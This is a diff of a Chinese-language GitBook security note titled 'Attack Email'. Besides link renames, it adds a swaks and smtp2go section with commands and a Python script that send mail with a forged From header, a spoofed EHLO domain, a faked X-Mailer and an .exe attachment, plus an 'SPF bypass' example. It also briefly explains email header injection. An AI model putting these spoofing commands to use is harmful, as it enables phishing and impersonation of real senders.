@@ -109,7 +109,7 @@
     <link rel="next" href="邮件协议.html" />
     
     
-    <link rel="prev" href="readme.html" />
+    <link rel="prev" href="a-readme.html" />
     
 
     <script src="../gitbook/gitbook-plugin-graph/d3.min.js"></script>
@@ -178,9 +178,9 @@
         
         
     
-        <li class="chapter " data-level="2.1" data-path="../web/readme.html">
+        <li class="chapter " data-level="2.1" data-path="../web/a-readme.html">
             
-                <a href="../web/readme.html">
+                <a href="../web/a-readme.html">
             
                     
                     Web
@@ -198,6 +198,19 @@
             
                     
                     CORS 跨域漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../web/Source Map 泄露.html">
+            
+                <a href="../web/Source Map 泄露.html">
+            
+                    
+                    Source Map 泄露
             
                 </a>
             
@@ -224,9 +237,9 @@
         
         
     
-        <li class="chapter " data-level="4.1" data-path="readme.html">
+        <li class="chapter " data-level="4.1" data-path="a-readme.html">
             
-                <a href="readme.html">
+                <a href="a-readme.html">
             
                     
                     Email
@@ -328,7 +341,7 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#邮件字段"><b></b>邮件字段</a></li><li><span class="title-icon "></span><a href="#邮件注入"><b></b>邮件注入</a></li><li><span class="title-icon "></span><a href="#0x00-前人栽树"><b></b>0x00 前人栽树</a></li></ul></div><a href="#邮件字段" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="邮件字段"><a name="邮件字段" class="anchor-navigation-ex-anchor" href="#邮件字段"><i class="fa fa-link" aria-hidden="true"></i></a>邮件字段</h1>
+                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#邮件字段"><b></b>邮件字段</a></li><li><span class="title-icon "></span><a href="#swaks"><b></b>swaks</a></li><li><span class="title-icon "></span><a href="#smtp2go"><b></b>smtp2go</a></li><li><span class="title-icon "></span><a href="#邮件注入"><b></b>邮件注入</a></li><ul><li><span class="title-icon "></span><a href="#注入分类"><b></b>注入分类</a></li></ul><li><span class="title-icon "></span><a href="#0x00-前人栽树"><b></b>0x00 前人栽树</a></li></ul></div><a href="#邮件字段" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="邮件字段"><a name="邮件字段" class="anchor-navigation-ex-anchor" href="#邮件字段"><i class="fa fa-link" aria-hidden="true"></i></a>邮件字段</h1>
 <table>
 <thead>
 <tr>
@@ -410,11 +423,98 @@
 </tr>
 </tbody>
 </table>
+<h1 id="swaks"><a name="swaks" class="anchor-navigation-ex-anchor" href="#swaks"><i class="fa fa-link" aria-hidden="true"></i></a>swaks</h1>
+<p>swaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester.</p>
+<p>swaks堪称SMTP协议的瑞士军刀，使用它我们可以灵活的操作 SMTP 协议报文。</p>
+<p><strong>常用指令</strong></p>
+<pre><code class="lang-shell">--to user@example.com：收件人
+
+--from me@example.com：发件人
+
+--server test-server.example.com：smtp 服务器
+
+-au me@example.com：邮件用户
+
+-ap xxxxpassword：密码
+
+--body [string or file path]：邮件正文
+
+--ehlo [helo-string]：伪造 ehlo 头信息 
+
+--header [header-and-data]：伪造 From、Subject、Message-Id、X-Mailer 等头信息，如 --header&apos;Subject：邮件主题内容&apos;
+
+--data [data-portion]：伪造 DATA 的全部内容，可直接将邮件源码作为选项 
+
+--attach [attachment-specification]：添加附件
+</code></pre>
+<p><strong>自定义 header 字段</strong></p>
+<blockquote>
+<p>swaks 支持自定义某些 Header，参数如下：
+<code>swaks --header-&lt;Name&gt; &lt;Value&gt;</code></p>
+<p>如果想去除 Mailer 特征，就可以这么做：
+<code>swaks --header-X-Mailer gmail.com</code></p>
+</blockquote>
+<p><strong>伪造 header-from</strong></p>
+<p><code>--h-From: &apos;管理员&lt;admin@qq.com&gt;&apos;</code></p>
+<p><strong>发送邮件原文和添加附件</strong></p>
+<ul>
+<li><code>--data 参数</code></li>
+<li><code>--attach 参数</code></li>
+</ul>
+<pre><code class="lang-shell">swaks --to 要发给的目标@gmail.com --from 你拥有的邮箱@xxxmail.net --ehlo gmail.com（需要攻击的域名） --data Test.eml（邮件原文。可以先用邮箱生成再导出邮件原文） --attach /tmp/附件.exe --header-X-Mailer gmail.com（需要攻击的域名） --server xxxmail.net（你邮箱的服务器） -p 25 -au 你拥有的邮箱账号@xxxmail.net -ap zqD2q7wkKbxxsdadda（密码）
+</code></pre>
+<p><strong>python 实现</strong></p>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-comment"># -*- coding: UTF-8 -*-</span>
+
+<span class="hljs-keyword">import</span> smtplib
+<span class="hljs-keyword">from</span> email.mime.text <span class="hljs-keyword">import</span> MIMEText
+<span class="hljs-keyword">from</span> email.header <span class="hljs-keyword">import</span> Header
+
+mail_host=<span class="hljs-string">&quot;mail.smtp2go.com&quot;</span>
+mail_user=<span class="hljs-string">&quot;&quot;</span>
+mail_pass=<span class="hljs-string">&quot;&quot;</span>
+
+sender = <span class="hljs-string">&apos;test@smtp2go.com&apos;</span>
+receivers = [<span class="hljs-string">&apos;target@gmail.com&apos;</span>]
+
+message = MIMEText(<span class="hljs-string">&apos;Hello World&apos;</span>, <span class="hljs-string">&apos;plain&apos;</span>, <span class="hljs-string">&apos;utf-8&apos;</span>)
+message[<span class="hljs-string">&apos;From&apos;</span>] = Header(<span class="hljs-string">&quot;admin@qq.com&quot;</span>, <span class="hljs-string">&apos;utf-8&apos;</span>)
+message[<span class="hljs-string">&apos;To&apos;</span>] =  Header(receivers[<span class="hljs-number">0</span>], <span class="hljs-string">&apos;utf-8&apos;</span>)
+
+subject = <span class="hljs-string">&apos;SMTP 邮件测试&apos;</span>
+message[<span class="hljs-string">&apos;Subject&apos;</span>] = Header(subject, <span class="hljs-string">&apos;utf-8&apos;</span>)
+
+<span class="hljs-keyword">try</span>:
+    smtpObj = smtplib.SMTP()
+    smtpObj.connect(mail_host, <span class="hljs-number">25</span>)
+    smtpObj.login(mail_user,mail_pass)
+    smtpObj.sendmail(sender, receivers, message.as_string())
+    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Success&quot;</span>
+<span class="hljs-keyword">except</span> smtplib.SMTPException:
+    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error&quot;</span>
+</code></pre>
+<h1 id="smtp2go"><a name="smtp2go" class="anchor-navigation-ex-anchor" href="#smtp2go"><i class="fa fa-link" aria-hidden="true"></i></a>smtp2go</h1>
+<blockquote>
+<p>smtp2go 主要是相当于邮件托管，可以分发子账户进行发送。</p>
+<p>地址：<a href="https://support.smtp2go.com/hc/en-gb" target="_blank">https://support.smtp2go.com/hc/en-gb</a></p>
+<p>（邮箱注册）普通账户可以免费发 1000 封邮件，需要境外手机号码（接码平台）。</p>
+</blockquote>
+<p>分配好账户后，可以通过 swaks 进行登录发送邮件：</p>
+<pre><code class="lang-shell">swaks --to evilxxx@gmail.com --from 需要伪造的@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au &lt;USER&gt; -ap &lt;PASS&gt;
+</code></pre>
+<p><img src="assets/Attack%20Email.png" alt></p>
+<p><strong>SPF 绕过</strong></p>
+<pre><code class="lang-shell">swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: &apos;管理员&lt;admin@qq.com&gt;&apos; --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au &lt;USER&gt; -ap &lt;PASSS&gt;
+</code></pre>
+<p>由于<strong>邮件显示</strong>的是 Header 中的 From 不是 <code>smtp.from</code>，因此可以将 <code>smtp.from</code> 设置为正常的邮件服务器地址，伪造一个 <code>Mail.From</code> 即可。</p>
+<p><img src="assets/Attack%20Email-1.png" alt></p>
+<p><strong>但是现在这种邮箱都会显示代发，又或者 mail.from（header.from） 和 smtp.from 不一致的话会直接被邮件服务器拒收。</strong></p>
 <h1 id="邮件注入"><a name="邮件注入" class="anchor-navigation-ex-anchor" href="#邮件注入"><i class="fa fa-link" aria-hidden="true"></i></a>邮件注入</h1>
 <p>邮件注入和 HTTP 头部注入相似，这种漏洞发生在一个编程语言嵌入另一个，比如 mysql 嵌入php。</p>
 <p>对于邮件头部的字段其实就是换行符 <code>0x0A</code> 或者 <code>0x0D0x0A</code> 分割 ，在绝大部分系统里面不是 <code>\n</code> 就是 <code>\r\n</code>，所以就可以注入了。</p>
 <p>电子邮件注入是针对邮件功能的一种攻击类型。它允许恶意攻击者注入任何邮件头字段，BCC、CC、主题等，它允许黑客通过注入手段从受害者的邮件服务器发送垃圾邮件。它可能会影响任何从用户 UI 接收消息并发送电子邮件消息的应用程序。这种攻击的主要原因是不适当的用户输入验证或应用程序根本没有验证和过滤机制。</p>
-<h4 id="注入分类"><a name="注入分类" class="anchor-navigation-ex-anchor" href="#注入分类"><i class="fa fa-link" aria-hidden="true"></i></a>注入分类</h4>
+<h2 id="注入分类"><a name="注入分类" class="anchor-navigation-ex-anchor" href="#注入分类"><i class="fa fa-link" aria-hidden="true"></i></a>注入分类</h2>
 <blockquote>
 <p>发件人，主题，内容</p>
 </blockquote>
@@ -442,7 +542,7 @@
 <li></li>
 </ul>
 <footer class="page-footer"><span class="copyright">Copyright &amp; Copy zha0cai all right reserved，powered by Gitbook</span><span class="footer-modification">该文件修订时间：
-2023-05-08 14:20:17
+2023-05-15 18:10:19
 </span></footer></body></html>
                                 
                                 </section>
@@ -470,7 +570,7 @@
 
             
                 
-                <a href="readme.html" class="navigation navigation-prev " aria-label="Previous page: Email">
+                <a href="a-readme.html" class="navigation navigation-prev " aria-label="Previous page: Email">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
@@ -486,7 +586,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"sticker":"1f48c","tag":"邮件, SMTP, 邮件攻防","title":"Attack Email","level":"4.1.1","depth":2,"next":{"title":"邮件协议","level":"4.1.2","depth":2,"path":"email/邮件协议.md","ref":"email/邮件协议.md","articles":[]},"previous":{"title":"Email","level":"4.1","depth":1,"path":"email/readme.md","ref":"email/readme.md","articles":[{"title":"Attack Email","level":"4.1.1","depth":2,"path":"email/Attack Email.md","ref":"email/Attack Email.md","articles":[]},{"title":"邮件协议","level":"4.1.2","depth":2,"path":"email/邮件协议.md","ref":"email/邮件协议.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["versions-select","-lunr","-search","search-pro","highlight","code","theme-comscore","-splitter","-summary","anchor-navigation-ex","expandable-chapters","versions-select","tbfed-pagefooter","flexible-alerts","advanced-emoji","ace","chart","graph","katex","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright & Copy zha0cai","modify_label":"该文件修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"ace":{},"livereload":{},"search-pro":{},"code":{"copyButtons":true},"versions-select":{"type":"branches"},"graph":{},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"showLevel":false,"associatedWithSummary":true,"mode":"float","showGoTop":true,"printLog":false,"multipleH1":true,"float":{"floatIcon":"fa fa-navicon","showLevelIcon":false,"level1Icon":"","level2Icon":"","level3Icon":""},"pageTop":{"showLevelIcon":false,"level1Icon":"","level2Icon":"","level3Icon":""}},"theme-comscore":{},"flexible-alerts":{"style":"callout","note":{"label":"Hinweis","icon":"fa fa-info-circle","className":"info"},"tip":{"label":"Tipp","icon":"fa fa-lightbulb-o","className":"tip"},"warning":{"label":"Warnung","icon":"fa fa-exclamation-triangle","className":"warning"},"danger":{"label":"Achtung","icon":"fa fa-ban","className":"danger"}},"versions":{"gitbookConfigURL":"book.json","options":[{"value":"https://zha0cai.github.io/gitbookPublic/home/","text":"Home Page","selected":true},{"value":"https://zha0cai.github.io/gitbookPublic/gitbook-security/","text":"Security Book","selected":true}]},"advanced-emoji":{"embedEmojis":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"chart":{"type":"c3"},"expandable-chapters":{}},"theme":"default","author":"zha0cai","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"readme.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"zha0cai's Security Book","language":"zh-hans","links":{"sidebar":{"My github":"https://github.com/zha0cai"}},"gitbook":"*"},"file":{"path":"email/Attack Email.md","mtime":"2023-05-08T06:20:17.559Z","type":"markdown"},"gitbook":{"version":"4.0.0","time":"2023-05-14T12:34:39.659Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"sticker":"1f48c","tag":"邮件, SMTP, 邮件攻防","title":"Attack Email","level":"4.1.1","depth":2,"next":{"title":"邮件协议","level":"4.1.2","depth":2,"path":"email/邮件协议.md","ref":"email/邮件协议.md","articles":[]},"previous":{"title":"Email","level":"4.1","depth":1,"path":"email/a-readme.md","ref":"email/a-readme.md","articles":[{"title":"Attack Email","level":"4.1.1","depth":2,"path":"email/Attack Email.md","ref":"email/Attack Email.md","articles":[]},{"title":"邮件协议","level":"4.1.2","depth":2,"path":"email/邮件协议.md","ref":"email/邮件协议.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["versions-select","-lunr","-search","search-pro","highlight","code","theme-comscore","-splitter","-summary","anchor-navigation-ex","expandable-chapters","versions-select","tbfed-pagefooter","flexible-alerts","advanced-emoji","ace","chart","graph","katex","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright & Copy zha0cai","modify_label":"该文件修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"ace":{},"livereload":{},"search-pro":{},"code":{"copyButtons":true},"versions-select":{"type":"branches"},"graph":{},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"showLevel":false,"associatedWithSummary":true,"mode":"float","showGoTop":true,"printLog":false,"multipleH1":true,"float":{"floatIcon":"fa fa-navicon","showLevelIcon":false,"level1Icon":"","level2Icon":"","level3Icon":""},"pageTop":{"showLevelIcon":false,"level1Icon":"","level2Icon":"","level3Icon":""}},"theme-comscore":{},"flexible-alerts":{"style":"callout","note":{"label":"Hinweis","icon":"fa fa-info-circle","className":"info"},"tip":{"label":"Tipp","icon":"fa fa-lightbulb-o","className":"tip"},"warning":{"label":"Warnung","icon":"fa fa-exclamation-triangle","className":"warning"},"danger":{"label":"Achtung","icon":"fa fa-ban","className":"danger"}},"versions":{"gitbookConfigURL":"book.json","options":[{"value":"https://zha0cai.github.io/gitbookPublic/home/","text":"Home Page","selected":true},{"value":"https://zha0cai.github.io/gitbookPublic/gitbook-security/","text":"Security Book","selected":true}]},"advanced-emoji":{"embedEmojis":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"chart":{"type":"c3"},"expandable-chapters":{}},"theme":"default","author":"zha0cai","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"readme.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"zha0cai's Security Book","language":"zh-hans","links":{"sidebar":{"My github":"https://github.com/zha0cai"}},"gitbook":"*"},"file":{"path":"email/Attack Email.md","mtime":"2023-05-15T10:10:19.293Z","type":"markdown"},"gitbook":{"version":"4.0.0","time":"2023-05-16T15:48:29.600Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
